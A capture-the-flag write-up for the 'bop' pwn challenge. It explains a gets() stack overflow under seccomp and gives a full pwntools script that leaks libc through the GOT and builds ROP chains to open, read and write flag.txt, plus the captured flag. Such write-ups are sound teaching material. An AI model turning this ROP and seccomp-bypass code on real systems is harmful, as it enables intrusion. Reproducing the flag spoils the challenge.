# bop

## Challenge

We're given a compiled C binary and a Dockerfile.

This is a fairly standard warm-up challenge, with the added obstacle of seccomp filters.

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

### Seccomp

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011
 0005: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0010
 0006: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0010
 0007: 0x15 0x02 0x00 0x00000002  if (A == open) goto 0010
 0008: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0010
 0009: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0011
 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0011: 0x06 0x00 0x00 0x00000000  return KILL
```

### Decompiled main

```c
void main(void) {
    char buf [32];

    setbuf(stdin,(char *)0x0);
    setbuf(stdout,(char *)0x0);
    setbuf(stderr,(char *)0x0);

    printf("Do you bop? ");
    gets(buf);
    return;
}
```

## Solution

There's an unsafe call to `gets` in `main`.
PIE is off and there is no canary, so we can trivially overflow the stack and write a rop chain.

We can call `printf` on GOT table entries to leak the libc address.
We then return to `main` to prepare a second rop chain.

In our second chain, we return to libc and use the `open`, `read`, and `write` syscalls to read the flag.

The Glibc `read` and `write` wrappers are okay to use, but the `open` wrapper uses `openat` internally, which is blacklisted in the filter.
Therefore, we have to setup this syscall manually using the rop chain.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host mc.ax --port 30284 bop
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('bop')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'mc.ax'
port = int(args.PORT or 30284)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

bss = exe.get_section_by_name('.bss')
writeable = bss.header['sh_addr'] + bss.header['sh_size']
exe.sym['main'] = exe.address + 0x12f9

libc = ELF('libc-2.31.so')

gdbscript = '''
tbreak *0x{exe.sym[main]:x}
continue
'''.format(**locals())

print(hex(exe.sym['main']))

io = start()

rop = ROP(exe)
rop.call('gets', [writeable])
rop.raw(rop.ret)
rop.call('printf', [writeable, exe.got['gets']])
rop.raw(rop.ret)
rop.call('main')

payload = flat({
    0x28: rop.chain(),
})

io.sendlineafter(b'Do you bop? ', payload)
io.sendline(b'%s')

libc.address = unpack(io.recvuntil(b'Do you bop? ', drop=True).ljust(8, b'\x00')) - libc.sym['gets']
print(hex(libc.address))

rop = ROP(libc)
rop.call('gets', [writeable])
rop(rax = 2, rdi = writeable, rsi = 0)
rop.raw(rop.find_gadget(['syscall', 'ret']).address) # open(writeable, 0)
rop.call('read', [3, writeable, 0x100])
rop.call('write', [1, writeable, 0x100])

print(rop.dump())

payload = flat({
    0x28: rop.chain(),
})

io.sendline(payload)
io.sendline(b'flag.txt')

io.interactive()
```

## Flag

```
dice{ba_da_ba_da_ba_be_bop_bop_bodda_bope_f8a01d8ec4e2}
```
